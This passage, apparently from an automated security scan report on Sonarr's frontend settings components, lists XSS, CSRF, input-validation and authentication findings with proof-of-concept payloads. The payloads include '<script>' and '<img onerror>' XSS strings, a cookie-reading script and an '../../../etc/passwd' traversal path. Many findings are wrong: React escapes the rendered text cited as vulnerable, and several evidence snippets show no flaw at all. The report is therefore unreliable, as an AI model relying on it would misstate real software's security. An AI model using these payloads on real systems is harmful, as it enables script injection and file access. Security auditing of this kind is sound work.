**File:** frontend/src/Settings/CustomFormats/CustomFormats/ExportCustomFormatModalContent.tsx
**Line:** 30

**Description:**
The export functionality uses a replacer function that doesn't properly neutralize special elements in output used by downstream components.

**Evidence:**
```
The replacer function in ExportCustomFormatModalContent.tsx removes certain properties but doesn't properly sanitize or neutralize special elements in field values.
```

**Impact:**
When exporting custom formats, special characters in field values might not be properly escaped, potentially causing issues when the exported JSON is imported back or used in other contexts.

**Proof of Concept:**
An attacker could create a custom format with field values containing special characters that would be interpreted incorrectly when the format is exported and then imported.

**How to Test:**
1. Create a custom format with special characters in field values
2. Export the format
3. Verify that special characters are properly handled in the exported JSON

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-74_frontend_src_Settings_CustomFormats_CustomFormats_ExportCustomFormatModalContenttsx.py`
---

### 26. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/MediaManagement/RootFolder/AddRootFolder.tsx
**Line:** 28

**Description:**
The error message in the AddRootFolder component displays raw error data without proper HTML escaping, potentially leading to XSS vulnerabilities when error messages contain malicious script content.

**Evidence:**
```
The error message displays `addError.statusBody` directly in a list without HTML escaping. The code shows: `<li>{JSON.stringify(addError.statusBody)}</li>`
```

**Impact:**
An attacker could inject malicious JavaScript code into error messages that would execute in the context of the authenticated user's browser, potentially leading to session hijacking or data exfiltration.

**Proof of Concept:**
If an API endpoint returns an error with statusBody containing: `{"errorMessage": "<script>alert('XSS')</script>"}`, the error message would render as raw HTML, executing the script tag.

**How to Test:**
1. Trigger an API error with malicious HTML content in the error message
2. Navigate to the Media Management settings page
3. Observe if the malicious script executes in the browser

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_MediaManagement_RootFolder_AddRootFoldertsx.py`
---

### 27. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/MediaManagement/Naming/NamingOption.tsx
**Line:** 50

**Description:**
The NamingOption component renders token values and examples without proper HTML escaping, which could lead to XSS vulnerabilities when tokens contain malicious content.

**Evidence:**
```
The component renders `token.replace(/ /g, tokenSeparator)` and `example.replace(/ /g, tokenSeparator)` without HTML escaping. The code shows: `<div className={styles.token}>{token.replace(/ /g, tokenSeparator)}</div>`
```

**Impact:**
If naming tokens contain malicious HTML/JavaScript, they could be executed when users view the naming options, potentially leading to session hijacking or data theft.

**Proof of Concept:**
If a naming token contains: `<img src=x onerror=alert('XSS')>` and this token is displayed in the naming modal, the image tag would execute the JavaScript when rendered.

**How to Test:**
1. Create a naming format with malicious HTML content
2. Open the naming modal
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_MediaManagement_Naming_NamingOptiontsx.py`
---

### 28. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/MediaManagement/Naming/NamingModal.tsx
**Line:** 150

**Description:**
The NamingModal component displays token examples and footnotes without proper HTML escaping, potentially allowing XSS through token content.

**Evidence:**
```
The component renders footnotes using `InlineMarkdown` and examples without HTML escaping. The code shows: `<InlineMarkdown data={translate('SeriesFootNote')} />`
```

**Impact:**
Malicious content in token examples or footnotes could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If the translation key 'SeriesFootNote' contains: `<script>document.cookie='malicious=' + document.cookie</script>`, this script would execute when the modal is opened.

**How to Test:**
1. Modify translation files to include malicious JavaScript in footnotes
2. Open the naming modal
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_MediaManagement_Naming_NamingModaltsx.py`
---

### 29. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/Tag.tsx
**Line:** 40

**Description:**
The Tag component displays tag labels without proper HTML escaping, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The component renders `label` directly without HTML escaping. The code shows: `<div className={styles.label}>{label}</div>`
```

**Impact:**
If tag labels contain malicious HTML/JavaScript, they could be executed when users view the tag list, potentially leading to session hijacking or data theft.

**Proof of Concept:**
If a tag label contains: `<img src=x onerror=alert('XSS')>` and this tag is displayed in the tag list, the image tag would execute the JavaScript when rendered.

**How to Test:**
1. Create a tag with malicious HTML content
2. Navigate to the tags settings page
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_Tagtsx.py`
---

### 30. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/TagInUse.tsx
**Line:** 10

**Description:**
The TagInUse component displays counts and labels without proper HTML escaping, potentially allowing XSS through tag usage information.

**Evidence:**
```
The component renders `count` and `label` directly without HTML escaping. The code shows: `<div>{count} {label.toLowerCase()}</div>`
```

**Impact:**
Malicious content in tag labels or counts could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If a tag label contains: `<script>document.cookie='malicious=' + document.cookie</script>` and this tag is displayed in the tag details, the script would execute when the modal is opened.

**How to Test:**
1. Create a tag with malicious HTML in its label
2. Navigate to the tag details modal
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_TagInUsetsx.py`
---

### 31. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/AutoTagging/EditAutoTaggingModalContent.tsx
**Line:** 100

**Description:**
The EditAutoTaggingModalContent component displays auto-tagging names and specifications without proper HTML escaping, potentially allowing XSS.

**Evidence:**
```
The component renders auto-tagging names and specification names without HTML escaping. The code shows: `<div className={styles.name}>{name}</div>`
```

**Impact:**
Malicious content in auto-tagging names or specification names could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If an auto-tagging name contains: `<script>document.cookie='malicious=' + document.cookie</script>` and this name is displayed in the modal, the script would execute when the modal is opened.

**How to Test:**
1. Create an auto-tagging with malicious HTML in its name
2. Open the auto-tagging edit modal
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_AutoTagging_EditAutoTaggingModalContenttsx.py`
---

### 32. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/AutoTagging/AutoTagging.tsx
**Line:** 50

**Description:**
The AutoTagging component displays auto-tagging names without proper HTML escaping, potentially allowing XSS.

**Evidence:**
```
The component renders `name` directly without HTML escaping. The code shows: `<div className={styles.name}>{name}</div>`
```

**Impact:**
Malicious content in auto-tagging names could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If an auto-tagging name contains: `<script>document.cookie='malicious=' + document.cookie</script>` and this name is displayed in the auto-tagging list, the script would execute when the page loads.

**How to Test:**
1. Create an auto-tagging with malicious HTML in its name
2. Navigate to the auto-tagging settings page
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_AutoTagging_AutoTaggingtsx.py`
---

### 33. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/AutoTagging/EditAutoTaggingModal.tsx
**Line:** 20

**Description:**
The EditAutoTaggingModal component displays auto-tagging names without proper HTML escaping, potentially allowing XSS.

**Evidence:**
```
The component renders auto-tagging names without HTML escaping. The code shows: `<ModalHeader>{id ? translate('EditAutoTag') : translate('AddAutoTag')}</ModalHeader>`
```

**Impact:**
Malicious content in auto-tagging names could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If an auto-tagging name contains: `<script>document.cookie='malicious=' + document.cookie</script>` and this name is displayed in the modal header, the script would execute when the modal is opened.

**How to Test:**
1. Create an auto-tagging with malicious HTML in its name
2. Open the auto-tagging edit modal
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_AutoTagging_EditAutoTaggingModaltsx.py`
---

### 34. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/AutoTagging/AutoTaggings.tsx
**Line:** 50

**Description:**
The AutoTaggings component displays auto-tagging names without proper HTML escaping, potentially allowing XSS.

**Evidence:**
```
The component renders auto-tagging names without HTML escaping. The code shows: `<div className={styles.autoTaggings}>`
```

**Impact:**
Malicious content in auto-tagging names could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If an auto-tagging name contains: `<script>document.cookie='malicious=' + document.cookie</script>` and this name is displayed in the auto-tagging list, the script would execute when the page loads.

**How to Test:**
1. Create an auto-tagging with malicious HTML in its name
2. Navigate to the auto-tagging settings page
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_AutoTagging_AutoTaggingstsx.py`
---

### 35. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/AutoTagging/Specifications/AddSpecificationModalContent.tsx
**Line:** 20

**Description:**
The AddSpecificationModalContent component displays specification names without proper HTML escaping, potentially allowing XSS.

**Evidence:**
```
The component renders specification names without HTML escaping. The code shows: `<div className={styles.specifications}>`
```

**Impact:**
Malicious content in specification names could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If a specification name contains: `<script>document.cookie='malicious=' + document.cookie</script>` and this name is displayed in the modal, the script would execute when the modal is opened.

**How to Test:**
1. Create a specification with malicious HTML in its name
2. Open the specification add modal
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_AutoTagging_Specifications_AddSpecificationModalContenttsx.py`
---

### 36. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/Tags/AutoTagging/Specifications/Specification.tsx
**Line:** 30

**Description:**
The Specification component displays specification names without proper HTML escaping, potentially allowing XSS.

**Evidence:**
```
The component renders specification names without HTML escaping. The code shows: `<Label key={index} kind={kind}>`
```

**Impact:**
Malicious content in specification names could execute JavaScript in the user's browser context, leading to potential session hijacking or data exfiltration.

**Proof of Concept:**
If a specification name contains: `<script>document.cookie='malicious=' + document.cookie</script>` and this name is displayed in the auto-tagging list, the script would execute when the page loads.

**How to Test:**
1. Create a specification with malicious HTML in its name
2. Navigate to the auto-tagging settings page
3. Verify if the malicious script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_Tags_AutoTagging_Specifications_Specificationtsx.py`
---

### 37. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/MediaManagement/Naming/NamingModal.tsx
**Line:** 100

**Description:**
The NamingModal component allows direct input of naming tokens without proper validation, potentially leading to injection vulnerabilities.

**Evidence:**
```
The component accepts user input for naming tokens and passes them directly to the backend without validation. The code shows: `onInputChange({ name, value: tokenValue })`
```

**Impact:**
Maliciously crafted naming tokens could be used to inject code or manipulate the file/folder naming process, potentially leading to path traversal or command injection.

**Proof of Concept:**
If a user inputs a naming token like `../{Series TitleYear}/` and this is used in file/folder creation, it could lead to path traversal vulnerabilities.

**How to Test:**
1. Navigate to the naming settings
2. Try to input malicious naming tokens
3. Verify if the system properly validates and sanitizes the tokens

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_MediaManagement_Naming_NamingModaltsx.py`
---

### 38. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/MediaManagement/Naming/Naming.tsx
**Line:** 150

**Description:**
The Naming component allows direct input of naming formats without proper validation, potentially leading to injection vulnerabilities.

**Evidence:**
```
The component accepts user input for naming formats and passes them directly to the backend without validation. The code shows: `updateSetting(key, change.value as NamingSettingsModel[typeof key])`
```

**Impact:**
Maliciously crafted naming formats could be used to inject code or manipulate the file/folder naming process, potentially leading to path traversal or command injection.

**Proof of Concept:**
If a user inputs a naming format like `../{Series TitleYear}/` and this is used in file/folder creation, it could lead to path traversal vulnerabilities.

**How to Test:**
1. Navigate to the naming settings
2. Try to input malicious naming formats
3. Verify if the system properly validates and sanitizes the formats

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_MediaManagement_Naming_Namingtsx.py`
---

### 39. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/MediaManagement/RootFolder/AddRootFolder.tsx
**Line:** 25

**Description:**
The AddRootFolder component accepts path inputs without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The component accepts path values directly from the file browser without validation. The code shows: `addRootFolder({ path: value })`
```

**Impact:**
Maliciously crafted paths could be used to traverse directories or access unauthorized files, potentially leading to information disclosure or privilege escalation.

**Proof of Concept:**
If a user inputs a path like `../../../etc/passwd` and this is used in file operations, it could lead to unauthorized file access.

**How to Test:**
1. Navigate to the root folder settings
2. Try to add a root folder with malicious path
3. Verify if the system properly validates and sanitizes the paths

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_MediaManagement_RootFolder_AddRootFoldertsx.py`
---

### 40. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/Tags/Tag.tsx
**Line:** 30

**Description:**
The Tag component accepts tag labels without proper validation, potentially allowing injection vulnerabilities.

**Evidence:**
```
The component accepts tag labels directly without validation. The code shows: `<div className={styles.label}>{label}</div>`
```

**Impact:**
Maliciously crafted tag labels could be used to inject code or manipulate tag display, potentially leading to XSS or other injection attacks.

**Proof of Concept:**
If a user creates a tag with label `<script>alert('XSS')</script>`, this could lead to XSS when the tag is displayed.

**How to Test:**
1. Create a tag with malicious HTML content
2. Navigate to the tags settings page
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_Tags_Tagtsx.py`
---

### 41. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/Tags/Tags.tsx
**Line:** 40

**Description:**
The Tags component accepts tag data without proper validation, potentially allowing injection vulnerabilities.

**Evidence:**
```
The component accepts tag data directly from the API without validation. The code shows: `items.map((item) => { return <Tag key={item.id} {...item} />; })`
```

**Impact:**
Maliciously crafted tag data could be used to inject code or manipulate tag display, potentially leading to XSS or other injection attacks.

**Proof of Concept:**
If an API returns tag data with malicious HTML content, this could lead to XSS when tags are displayed.

**How to Test:**
1. Modify API response to include malicious tag data
2. Navigate to the tags settings page
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_Tags_Tagstsx.py`
---

### 42. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/Tags/AutoTagging/EditAutoTaggingModalContent.tsx
**Line:** 100

**Description:**
The EditAutoTaggingModalContent component accepts auto-tagging data without proper validation, potentially allowing injection vulnerabilities.

**Evidence:**
```
The component accepts auto-tagging data directly from the API without validation. The code shows: `dispatch(setAutoTaggingValue({ name, value }))`
```

**Impact:**
Maliciously crafted auto-tagging data could be used to inject code or manipulate auto-tagging behavior, potentially leading to XSS or other injection attacks.

**Proof of Concept:**
If an API returns auto-tagging data with malicious HTML content, this could lead to XSS when the modal is displayed.

**How to Test:**
1. Modify API response to include malicious auto-tagging data
2. Open the auto-tagging edit modal
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_Tags_AutoTagging_EditAutoTaggingModalContenttsx.py`
---

### 43. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/Tags/AutoTagging/AutoTaggings.tsx
**Line:** 40

**Description:**
The AutoTaggings component accepts auto-tagging data without proper validation, potentially allowing injection vulnerabilities.

**Evidence:**
```
The component accepts auto-tagging data directly from the API without validation. The code shows: `items.map((item) => { return <AutoTagging key={item.id} {...item} />; })`
```

**Impact:**
Maliciously crafted auto-tagging data could be used to inject code or manipulate auto-tagging display, potentially leading to XSS or other injection attacks.

**Proof of Concept:**
If an API returns auto-tagging data with malicious HTML content, this could lead to XSS when auto-taggings are displayed.

**How to Test:**
1. Modify API response to include malicious auto-tagging data
2. Navigate to the auto-tagging settings page
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_Tags_AutoTagging_AutoTaggingstsx.py`
---

### 44. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/Tags/AutoTagging/Specifications/AddSpecificationModalContent.tsx
**Line:** 20

**Description:**
The AddSpecificationModalContent component accepts specification data without proper validation, potentially allowing injection vulnerabilities.

**Evidence:**
```
The component accepts specification data directly from the API without validation. The code shows: `specifications.map((specification) => { return <Specification key={specification.id} {...specification} />; })`
```

**Impact:**
Maliciously crafted specification data could be used to inject code or manipulate specification display, potentially leading to XSS or other injection attacks.

**Proof of Concept:**
If an API returns specification data with malicious HTML content, this could lead to XSS when specifications are displayed.

**How to Test:**
1. Modify API response to include malicious specification data
2. Open the specification add modal
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_Tags_AutoTagging_Specifications_AddSpecificationModalContenttsx.py`
---

### 45. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/Tags/AutoTagging/Specifications/Specification.tsx
**Line:** 30

**Description:**
The Specification component accepts specification data without proper validation, potentially allowing injection vulnerabilities.

**Evidence:**
```
The component accepts specification data directly without validation. The code shows: `<Label key={index} kind={kind}>`
```

**Impact:**
Maliciously crafted specification data could be used to inject code or manipulate specification display, potentially leading to XSS or other injection attacks.

**Proof of Concept:**
If a specification contains malicious HTML content, this could lead to XSS when the specification is displayed.

**How to Test:**
1. Create a specification with malicious HTML content
2. Navigate to the auto-tagging settings page
3. Verify if the malicious content executes as JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_Tags_AutoTagging_Specifications_Specificationtsx.py`
---

### 46. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/MediaManagement/RootFolder/AddRootFolder.tsx
**Line:** 25

**Description:**
The AddRootFolder component lacks CSRF protection for root folder addition operations, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `addRootFolder({ path: value })`
```

**Impact:**
An attacker could trick a user into adding a malicious root folder by crafting a forged request, potentially leading to unauthorized file access or path traversal.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to add a root folder with a malicious path when a user visits the page.

**How to Test:**
1. Monitor network requests when adding a root folder
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_MediaManagement_RootFolder_AddRootFoldertsx.py`
---

### 47. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/Tags/Tag.tsx
**Line:** 30

**Description:**
The Tag component lacks CSRF protection for tag operations, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `deleteTag()`
```

**Impact:**
An attacker could trick a user into deleting or modifying tags by crafting a forged request, potentially leading to unauthorized tag management.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to delete a tag when a user visits the page.

**How to Test:**
1. Monitor network requests when deleting a tag
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_Tags_Tagtsx.py`
---

### 48. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/Tags/AutoTagging/EditAutoTaggingModalContent.tsx
**Line:** 100

**Description:**
The EditAutoTaggingModalContent component lacks CSRF protection for auto-tagging operations, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `dispatch(saveAutoTagging({ id }))`
```

**Impact:**
An attacker could trick a user into saving or modifying auto-tagging configurations by crafting a forged request, potentially leading to unauthorized configuration changes.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to save an auto-tagging configuration when a user visits the page.

**How to Test:**
1. Monitor network requests when saving an auto-tagging
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_Tags_AutoTagging_EditAutoTaggingModalContenttsx.py`
---

### 49. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/Tags/AutoTagging/AutoTaggings.tsx
**Line:** 40

**Description:**
The AutoTaggings component lacks CSRF protection for auto-tagging operations, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `dispatch(deleteAutoTagging({ id }))`
```

**Impact:**
An attacker could trick a user into deleting auto-tagging configurations by crafting a forged request, potentially leading to unauthorized configuration changes.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to delete an auto-tagging when a user visits the page.

**How to Test:**
1. Monitor network requests when deleting an auto-tagging
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_Tags_AutoTagging_AutoTaggingstsx.py`
---

### 50. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/Tags/AutoTagging/Specifications/AddSpecificationModalContent.tsx
**Line:** 20

**Description:**
The AddSpecificationModalContent component lacks CSRF protection for specification operations, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `dispatch(cloneAutoTaggingSpecification({ id: specId }))`
```

**Impact:**
An attacker could trick a user into cloning or modifying specifications by crafting a forged request, potentially leading to unauthorized specification changes.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to clone a specification when a user visits the page.

**How to Test:**
1. Monitor network requests when cloning a specification
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_Tags_AutoTagging_Specifications_AddSpecificationModalContenttsx.py`
---

### 51. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/Tags/AutoTagging/Specifications/Specification.tsx
**Line:** 30

**Description:**
The Specification component lacks CSRF protection for specification operations, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `dispatch(deleteAutoTaggingSpecification({ id: specId }))`
```

**Impact:**
An attacker could trick a user into deleting or modifying specifications by crafting a forged request, potentially leading to unauthorized specification changes.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to delete a specification when a user visits the page.

**How to Test:**
1. Monitor network requests when deleting a specification
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_Tags_AutoTagging_Specifications_Specificationtsx.py`
---

### 52. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/MediaManagement/MediaManagement.tsx
**Line:** 100

**Description:**
The MediaManagement component lacks CSRF protection for media management settings, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `saveMediaManagementSettings()`
```

**Impact:**
An attacker could trick a user into saving media management settings by crafting a forged request, potentially leading to unauthorized configuration changes.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to save media management settings when a user visits the page.

**How to Test:**
1. Monitor network requests when saving media management settings
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_MediaManagement_MediaManagementtsx.py`
---

### 53. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/MediaManagement/Naming/Naming.tsx
**Line:** 150

**Description:**
The Naming component lacks CSRF protection for naming settings, potentially allowing CSRF attacks.

**Evidence:**
```
The component uses direct API calls without CSRF token handling. The code shows: `saveSettings()`
```

**Impact:**
An attacker could trick a user into saving naming settings by crafting a forged request, potentially leading to unauthorized configuration changes.

**Proof of Concept:**
An attacker could create a malicious page that automatically submits a request to save naming settings when a user visits the page.

**How to Test:**
1. Monitor network requests when saving naming settings
2. Check if CSRF tokens are included in requests
3. Try to manually craft a request without CSRF token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_MediaManagement_Naming_Namingtsx.py`
---

### 54. Cross-site Scripting (CWE-79)

**File:** frontend/src/Settings/ImportLists/ImportLists/Manage/ManageImportListsModalContent.tsx
**Line:** 157

**Description:**
The code uses translate() function for localization but doesn't properly sanitize user input before rendering, potentially leading to XSS vulnerabilities when displaying dynamic content.

**Evidence:**
```
The translate() function is used throughout the component for labels and messages, but there's no explicit sanitization of dynamic content that might come from user inputs or API responses.
```

**Impact:**
An attacker could inject malicious JavaScript code through translated strings or dynamic content that gets rendered in the UI, leading to session hijacking or data theft.

**Proof of Concept:**
If a translated string contains user-controllable content (e.g., import list names or descriptions) that isn't properly sanitized, an attacker could inject script tags that execute when the modal is displayed.

**How to Test:**
1. Check if any user-controllable strings are passed to translate() functions
2. Verify that dynamic content from API responses is properly sanitized
3. Test with malicious strings in import list names or descriptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Settings_ImportLists_ImportLists_Manage_ManageImportListsModalContenttsx.py`
---

### 55. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Settings/ImportLists/ImportLists/Manage/ManageImportListsModalContent.tsx
**Line:** 129

**Description:**
The bulk delete functionality lacks CSRF protection, making it vulnerable to CSRF attacks where an attacker could delete import lists without user consent.

**Evidence:**
```
The bulkDeleteImportLists action is dispatched directly from the UI without any CSRF token validation in the frontend code.
```

**Impact:**
An attacker could craft a malicious page that triggers bulk deletion of import lists when a user visits the page, potentially leading to data loss or service disruption.

**Proof of Concept:**
An attacker could create a page with a hidden form that submits to the bulk delete endpoint, causing the user's import lists to be deleted when they visit the malicious site.

**How to Test:**
1. Check if bulk delete operations include CSRF tokens
2. Verify that the API endpoints for bulk operations validate CSRF tokens
3. Test if the application works without CSRF protection

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Settings_ImportLists_ImportLists_Manage_ManageImportListsModalContenttsx.py`
---

### 56. Improper Input Validation (CWE-20)

**File:** frontend/src/Settings/ImportLists/ImportLists/Manage/ManageImportListsModalContent.tsx
**Line:** 108

**Description:**
The selectedIds array is used directly in bulk operations without proper validation, potentially allowing invalid IDs to be passed to the backend.

**Evidence:**
```
The selectedIds array is passed directly to bulkDeleteImportLists and bulkEditImportLists without validation of the array contents or ID formats.
```

**Impact:**
Invalid IDs could cause backend errors or unexpected behavior, and could potentially be exploited to target non-existent import lists.

**Proof of Concept:**
An attacker could manipulate the selectedIds array to include invalid IDs or IDs of other users' import lists, potentially causing errors or unauthorized operations.

**How to Test:**
1. Test bulk operations with empty or invalid IDs in selectedIds
2. Verify that the backend properly validates IDs before processing
3. Check if the frontend validates that selected IDs belong to the current user

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Settings_ImportLists_ImportLists_Manage_ManageImportListsModalContenttsx.py`
---

### 57. Improper Neutralization of Special Elements in Output Used by a Downstream Component (CWE-74)

**File:** frontend/src/Settings/ImportLists/ImportLists/Manage/Tags/TagsModalContent.tsx
**Line:** 100

**Description:**
The tag labels are rendered directly without proper sanitization, potentially allowing special characters or HTML to be injected into the UI.

**Evidence:**
```
Tag labels are rendered using the tag.label property directly in Label components without HTML sanitization.
```

**Impact:**
Malicious tag names could contain HTML or JavaScript that gets executed in the UI, leading to XSS vulnerabilities.

**Proof of Concept:**
If a tag name contains HTML like '<script>alert(1)</script>' or '<img src=x onerror=alert(1)>', it could be executed when the tag is displayed in the modal.

**How to Test:**
1. Create tags with special HTML characters in their names
2. Verify that these characters are properly escaped in the UI
3. Test with malicious tag names that include JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-74_frontend_src_Settings_ImportLists_ImportLists_Manage_Tags_TagsModalContenttsx.py`
---

### 58. Improper Authentication (CWE-287)

**File:** frontend/src/Settings/ImportLists/ImportLists/Manage/ManageImportListsModalContent.tsx
**Line:** 139

**Description:**
The component doesn't explicitly check for authentication state before allowing bulk operations, potentially allowing unauthorized access to import list management.

**Evidence:**
```
The component uses Redux selectors and dispatches actions but doesn't verify authentication status before enabling bulk operations.
```

**Impact:**
Unauthenticated users might be able to perform bulk operations on import lists, potentially leading to unauthorized modifications.

**Proof of Concept:**
An attacker could access the import list management UI without being authenticated and perform bulk operations if the frontend doesn't enforce authentication.

**How to Test:**
1. Test access to import list management without authentication
2. Verify that authentication is enforced at the component level
3. Check if unauthorized bulk operations are rejected by the backend

